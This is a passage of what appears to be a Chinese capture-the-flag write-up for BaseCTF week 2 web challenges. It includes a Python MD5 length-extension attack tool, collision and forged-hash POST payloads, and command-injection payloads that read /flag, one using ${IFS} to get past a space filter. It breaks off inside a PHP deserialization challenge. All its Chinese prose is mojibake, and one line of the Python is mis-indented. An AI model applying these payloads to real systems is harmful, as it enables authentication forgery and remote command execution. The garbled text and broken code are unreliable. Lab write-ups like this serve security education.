class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>] * <span class="number">4</span> + [<span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>] * <span class="number">4</span> + \</span><br><span class="line">            [<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>] * <span class="number">4</span> + [<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>] * <span class="number">4</span>  <span class="comment"># shift values</span></span><br><span class="line">        <span class="variable language_">self</span>.k: <span class="built_in">list</span>[<span class="built_in">int</span>] = \</span><br><span class="line">            [floor(<span class="built_in">abs</span>(sin(i + <span class="number">1</span>)) * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line">             <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]  <span class="comment"># constants</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_lrot</span>(<span class="params">self, x: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># left rotate</span></span><br><span class="line">        <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; <span class="number">32</span> - n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, chunk: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># update the hash for a chunk of data (64 bytes)</span></span><br><span class="line">        w = <span class="built_in">list</span>(unpack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;I&#x27;</span>*<span class="number">16</span>, chunk))</span><br><span class="line">        a, b, c, d = <span class="variable language_">self</span>.A, <span class="variable language_">self</span>.B, <span class="variable language_">self</span>.C, <span class="variable language_">self</span>.D</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">                f = (b &amp; c) | ((~b) &amp; d)</span><br><span class="line">                flag = i</span><br><span class="line">            <span class="keyword">elif</span> i &lt; <span class="number">32</span>:</span><br><span class="line">                f = (b &amp; d) | (c &amp; (~d))</span><br><span class="line">                flag = (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">elif</span> i &lt; <span class="number">48</span>:</span><br><span class="line">                f = (b ^ c ^ d)</span><br><span class="line">                flag = (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f = c ^ (b | (~d))</span><br><span class="line">                flag = (<span class="number">7</span> * i) % <span class="number">16</span></span><br><span class="line"></span><br><span class="line">            tmp = b + \</span><br><span class="line">                <span class="variable language_">self</span>._lrot((a + f + <span class="variable language_">self</span>.k[i] + w[flag])</span><br><span class="line">                           &amp; <span class="number">0xffffffff</span>, <span class="variable language_">self</span>.r[i])</span><br><span class="line">            a, b, c, d = d, tmp &amp; <span class="number">0xffffffff</span>, b, c</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.A = (<span class="variable language_">self</span>.A + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.B = (<span class="variable language_">self</span>.B + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.C = (<span class="variable language_">self</span>.C + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.D = (<span class="variable language_">self</span>.D + d) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">self, msg: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># extend the hash with a new message (padded)</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(msg) % <span class="number">64</span> == <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">64</span>):</span><br><span class="line">            <span class="variable language_">self</span>.update(msg[i:i + <span class="number">64</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">self, msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># pad the message</span></span><br><span class="line">        length = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">len</span>(msg) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        msg += <span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line">        msg += <span class="string">b&#x27;\x00&#x27;</span> * ((<span class="number">56</span> - <span class="built_in">len</span>(msg)) % <span class="number">64</span>)</span><br><span class="line">        msg += length</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">digest</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># return the hash</span></span><br><span class="line">        <span class="keyword">return</span> pack(<span class="string">&#x27;&lt;IIII&#x27;</span>, <span class="variable language_">self</span>.A, <span class="variable language_">self</span>.B, <span class="variable language_">self</span>.C, <span class="variable language_">self</span>.D)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_md5</span>(<span class="params">test_string: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># (DEBUG function) verify the MD5 implementation</span></span><br><span class="line">    <span class="keyword">from</span> hashlib <span class="keyword">import</span> md5 <span class="keyword">as</span> md5_hashlib</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">md5_manual</span>(<span class="params">msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        md5 = MD5()</span><br><span class="line">        md5.extend(md5.padding(msg))</span><br><span class="line">        <span class="keyword">return</span> md5.digest()</span><br><span class="line"></span><br><span class="line">    manual_result = md5_manual(test_string).<span class="built_in">hex</span>()</span><br><span class="line">    hashlib_result = md5_hashlib(test_string).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> manual_result == hashlib_result, <span class="string">&quot;Test failed!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">message_len: <span class="built_in">int</span>, known_hash: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">           append_str: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">    <span class="comment"># MD5 extension attack</span></span><br><span class="line">    md5 = MD5()</span><br><span class="line"></span><br><span class="line">    previous_text = md5.padding(<span class="string">b&quot;*&quot;</span> * message_len)</span><br><span class="line">    current_text = previous_text + append_str</span><br><span class="line"></span><br><span class="line">    md5.A, md5.B, md5.C, md5.D = unpack(<span class="string">&quot;&lt;IIII&quot;</span>, <span class="built_in">bytes</span>.fromhex(known_hash))</span><br><span class="line">    md5.extend(md5.padding(current_text)[<span class="built_in">len</span>(previous_text):])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> current_text[message_len:], md5.digest().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    message_len = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[&gt;] Input known text length: &quot;</span>))</span><br><span class="line">    known_hash = <span class="built_in">input</span>(<span class="string">&quot;[&gt;] Input known hash: &quot;</span>).strip()</span><br><span class="line">    append_text = <span class="built_in">input</span>(<span class="string">&quot;[&gt;] Input append text: &quot;</span>).strip().encode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Attacking...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    extend_str, final_hash = attack(message_len, known_hash, append_text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">    <span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Extend text:&quot;</span>, extend_str)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Extend text (URL encoded):&quot;</span>, quote(extend_str))Â·Â·</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Final hash:&quot;</span>, final_hash)</span><br></pre></td></tr></table></figure><p> æ­¤å·¥å…·éœ€è¦å‡ æ ·å‚æ•°ï¼šæ˜æ–‡é•¿åº¦ï¼Œå·²çŸ¥æ˜æ–‡hashå€¼ï¼Œæœ«å°¾å­—ç¬¦ä¸²</p><p>æ ¹æ®é¢˜ç›®åˆ†æåˆ†åˆ«å¡«å…¥96,66413c749dcb99fad13263f16a164bf2,admin</p><p><img src="/2024/09/11/BaseCTF-week2/image-20240903134538164-17260236445962.png" alt="image-20240903134538164"></p><p>é€šè¿‡å·¥å…·è®¡ç®—å‡ºnameçš„å€¼ä¸ºExtend textå­—ç¬¦ä¸²ï¼Œæ–°ç”Ÿæˆçš„æ‹“å±•hashå€¼ä¸º Final hash</p><p>payloadï¼ˆpostæäº¤ï¼‰</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple[]=<span class="number">1</span>&amp;banana[]=<span class="number">2</span>&amp;appple=0e215962017&amp;bananana=s214587387a&amp;apppple=<span class="meta">%EC</span><span class="meta">%877</span><span class="meta">%A6</span><span class="meta">%27TN</span><span class="meta">%AB</span><span class="meta">%A4p</span><span class="meta">%9C8J</span><span class="meta">%97y</span><span class="meta">%91</span><span class="meta">%15UQ</span><span class="meta">%D6</span><span class="meta">%7E</span><span class="meta">%A6</span><span class="meta">%BC</span><span class="meta">%C8</span><span class="meta">%26</span><span class="meta">%8Ez</span><span class="meta">%22q</span><span class="meta">%B1</span><span class="meta">%09</span><span class="meta">%C2</span><span class="meta">%DA</span><span class="meta">%D4</span><span class="meta">%04</span><span class="meta">%CEP</span><span class="meta">%B6</span><span class="meta">%CB</span><span class="meta">%1D</span><span class="meta">%EF</span><span class="meta">%0Fe</span><span class="meta">%3A</span><span class="meta">%BF</span><span class="meta">%23</span><span class="meta">%3AB</span><span class="meta">%A9</span><span class="meta">%1EJ</span><span class="meta">%60_</span><span class="meta">%D9V</span><span class="meta">%00</span><span class="meta">%0F</span><span class="meta">%C5</span><span class="meta">%8C</span><span class="meta">%CC</span><span class="meta">%24</span><span class="meta">%24</span><span class="meta">%8B4</span><span class="meta">%05</span><span class="meta">%FA</span><span class="meta">%0B</span><span class="meta">%C4</span><span class="meta">%CD</span><span class="meta">%00</span><span class="meta">%FF</span><span class="meta">%16uz</span><span class="meta">%CCy</span><span class="meta">%DA</span><span class="meta">%C7x</span><span class="meta">%B9</span><span class="meta">%B5</span><span class="meta">%B4</span><span class="meta">%05</span><span class="meta">%26</span><span class="meta">%BA</span><span class="meta">%C7r</span><span class="meta">%EB</span><span class="meta">%EA</span><span class="meta">%FC</span><span class="meta">%DC</span><span class="meta">%B5</span><span class="meta">%CFM</span><span class="meta">%FE</span><span class="meta">%CD</span><span class="meta">%91</span><span class="meta">%27</span><span class="meta">%BB</span><span class="meta">%EDc</span><span class="meta">%B4</span><span class="meta">%AF</span><span class="meta">%E6</span><span class="meta">%86</span><span class="meta">%9EQ</span><span class="meta">%AA</span><span class="meta">%89</span><span class="meta">%FC</span><span class="meta">%0D</span><span class="meta">%FC</span><span class="meta">%1E</span><span class="meta">%093</span><span class="meta">%B3</span><span class="meta">%8B</span><span class="meta">%BE</span><span class="meta">%C3</span><span class="meta">%99</span><span class="meta">%E5Y</span><span class="meta">%C7</span><span class="meta">%E8</span><span class="meta">%12QC</span><span class="meta">%9C</span>&amp;banananana=<span class="meta">%EC</span><span class="meta">%877</span><span class="meta">%A6</span><span class="meta">%27TN</span><span class="meta">%AB</span><span class="meta">%A4p</span><span class="meta">%9C8J</span><span class="meta">%97y</span><span class="meta">%91</span><span class="meta">%15UQV</span><span class="meta">%7E</span><span class="meta">%A6</span><span class="meta">%BC</span><span class="meta">%C8</span><span class="meta">%26</span><span class="meta">%8Ez</span><span class="meta">%22q</span><span class="meta">%B1</span><span class="meta">%09</span><span class="meta">%C2</span><span class="meta">%DA</span><span class="meta">%D4</span><span class="meta">%04</span><span class="meta">%CEP</span><span class="meta">%B6</span><span class="meta">%CB</span><span class="meta">%1D</span><span class="meta">%EF</span><span class="meta">%0Fe</span><span class="meta">%3A</span><span class="meta">%BF</span><span class="meta">%A39B</span><span class="meta">%A9</span><span class="meta">%1EJ</span><span class="meta">%60_</span><span class="meta">%D9V</span><span class="meta">%00</span><span class="meta">%0F</span><span class="meta">%C5</span><span class="meta">%8CL</span><span class="meta">%24</span><span class="meta">%24</span><span class="meta">%8B4</span><span class="meta">%05</span><span class="meta">%FA</span><span class="meta">%0B</span><span class="meta">%C4</span><span class="meta">%CD</span><span class="meta">%00</span><span class="meta">%FF</span><span class="meta">%16uz</span><span class="meta">%CCy</span><span class="meta">%DA</span><span class="meta">%C7x</span><span class="meta">%B9</span><span class="meta">%B5</span><span class="meta">%B4</span><span class="meta">%05</span><span class="meta">%A6</span><span class="meta">%BA</span><span class="meta">%C7r</span><span class="meta">%EB</span><span class="meta">%EA</span><span class="meta">%FC</span><span class="meta">%DC</span><span class="meta">%B5</span><span class="meta">%CFM</span><span class="meta">%FE</span><span class="meta">%CD</span><span class="meta">%91</span><span class="meta">%27</span><span class="meta">%BB</span><span class="meta">%EDc</span><span class="meta">%B4</span><span class="meta">%AF</span><span class="meta">%E6</span><span class="meta">%86</span><span class="meta">%9EQ</span><span class="meta">%AA</span><span class="meta">%89</span><span class="meta">%7C</span><span class="meta">%0E</span><span class="meta">%FC</span><span class="meta">%1E</span><span class="meta">%093</span><span class="meta">%B3</span><span class="meta">%8B</span><span class="meta">%BE</span><span class="meta">%C3</span><span class="meta">%99</span><span class="meta">%E5Y</span><span class="meta">%C7h</span><span class="meta">%12QC</span><span class="meta">%9C</span><span class="built_in">&amp;name</span>=<span class="meta">%80</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%03</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00</span><span class="meta">%00admin</span>&amp;md5=e3de88ef6ff21cec04dac8f6b8158797</span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/BaseCTF-week2/image-20240903134813566-17260236445964.png" alt="image-20240903134813566"></p><p>ç‰¹åˆ«æ³¨æ„ï¼š</p><p>ä¸åŒçš„md5æ‹“å±•æ”»å‡»ä½¿ç”¨çš„å·¥å…·ä¸ä¸€æ ·ï¼Œå¤§æ¦‚æœ‰ä¸¤ç§ä¸åŒçš„æ‹“å±•æƒ…å†µ</p><p>ä¸€ç§æ˜¯æ‹“å±•å­—ç¬¦ä¸²ä¸­æ²¡æœ‰æ˜æ–‡å†…å®¹ï¼Œä¹Ÿå°±åƒé¢˜ç›®ä¸­çš„æƒ…å†µï¼Œéœ€è¦æ‹“å±•çš„å­—ç¬¦ä¸²nameä¸å«æ˜æ–‡å†…å®¹ï¼Œå³å¯ä½¿ç”¨æœ¬æ–‡ç»™å‡ºå·¥å…·ï¼Œè¿›è¡Œä¸åŒ…å«æ˜æ–‡çš„å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ï¼›</p><p>å¦å¤–ä¸€ç§æ˜¯æ‹“å±•å­—ç¬¦ä¸²ä¸­å­˜åœ¨æ˜æ–‡å†…å®¹ï¼Œä¸¾ä¾‹å‚è€ƒæ–‡ç« ä¸­å‡ºç°ä¾‹é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$secretKey</span> = <span class="string">&#x27;xxxxxx&#x27;</span>; <span class="comment">#xxxä¸ºæœªçŸ¥å†…å®¹ï¼Œä½†é•¿åº¦å·²çŸ¥ä¸º6ã€‚</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$secretKey</span>.<span class="variable">$v1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$token</span>); <span class="comment">//token=2df51a84abc64a28740d6d2ae8cd7b16</span></span><br><span class="line">                 <span class="comment">//è¾“å‡º$tokenéœ€è¦ä½¿$token=$secretKey.&#x27;test&#x27;ï¼Œæ‰€ä»¥&#x27;test&#x27;åœ¨æœ¬é¢˜ä¸­ä¹Ÿç®—æ˜æ–‡ï¼Œæ•…v1éœ€è¦å¸¦ä¸Š&#x27;test&#x27;æ¥ä¸€èµ·è¿›è¡Œé•¿åº¦æ‹“å±•</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span> === <span class="variable">$sign</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤å¤„çš„v1è™½ä¸ºæ‹“å±•å­—ç¬¦ä¸²ï¼Œä½†æ˜¯åŒ…å«éƒ¨åˆ†æ˜æ–‡å†…å®¹â€testâ€ï¼Œè¿™æ—¶ä½¿ç”¨çš„å·¥å…·ä¸ºhashpumpï¼Œå…·ä½“ä½¿ç”¨æ•™ç¨‹åœ¨æ­¤æ•™ç¨‹ä¸­ï¼š</p><p><a href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a></p><h3 id="ä¸€èµ·åƒè±†è±†"><a href="#ä¸€èµ·åƒè±†è±†" class="headerlink" title="ä¸€èµ·åƒè±†è±†"></a>ä¸€èµ·åƒè±†è±†</h3><p>å…³é—­æµè§ˆå™¨çš„javascirptï¼Œå°±å¯ä»¥æŸ¥çœ‹è¯¥é¡¹ç›®çš„åŸç </p><p>jsæ¸¸æˆé¢˜ç›®ä¸€èˆ¬æœ‰ä¸¤ç§å¸¸è§æ€è·¯ï¼Œä¸€ç§æ˜¯ä¿®æ”¹æ•°å€¼ï¼Œå¦ä¸€ç§æ˜¯æºç å®¡è®¡ï¼Œè¿™ä¸€é¢˜å°±æ˜¯æºç å®¡è®¡çš„æ€è·¯ï¼Œåœ¨index.jsæ–‡ä»¶ä¸­æœç´¢æ‰¾åˆ°ä¸€ä¸²å¯ç–‘çš„å­—ç¬¦ä¸²</p><p><img src="/2024/09/11/BaseCTF-week2/image-20240903153435878-17260236445963.png" alt="image-20240903153435878"></p><p>ç›´æ¥å°†å…¶å¤åˆ¶åˆ°æ§åˆ¶å°å³å¯<del>base64è§£ç ä¹Ÿå¯</del></p><p><img src="/2024/09/11/BaseCTF-week2/image-20240903153611534-17260236445951.png" alt="image-20240903153611534"></p><h3 id="ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³"><a href="#ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³" class="headerlink" title="ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³"></a>ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>åˆ†æshell_execå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä¸ä¼šå›æ˜¾ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨å¤–å¸¦æˆ–è€…teeå‘½ä»¤è¯»å–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå¹¶ä¸”å°†ç»“æœé‡å®šå‘åˆ°æŒ‡å®šæ–‡ä»¶ä¸­</p><p>payload postæäº¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">cat</span> /flag|<span class="built_in">tee</span> 1.txt</span><br></pre></td></tr></table></figure><p>ä¹‹åè®¿é—®å½“å‰ç›®å½•ä¸‹çš„1.txtå³å¯</p><p><img src="/2024/09/11/BaseCTF-week2/image-20240903162922628-17260236445965.png" alt="image-20240903162922628"></p><h3 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="comment">// check if space is present in the command</span></span><br><span class="line"><span class="comment">// use of preg_match to check if space is present in the command</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\s/&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Space not allowed in command&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// execute the command</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œï¼Œè¿‡æ»¤ç©ºæ ¼å¯ç”¨${IFS}ç»•è¿‡</p><p>payloadï¼ˆpostï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/flag</span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/BaseCTF-week2/image-20240903164726532-17260236445966.png" alt="image-20240903164726532"></p><h3 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ä»€ä¹ˆï¼Œä½ ç«Ÿæ•¢ä¸è®¤å¯?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;happy happy happy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 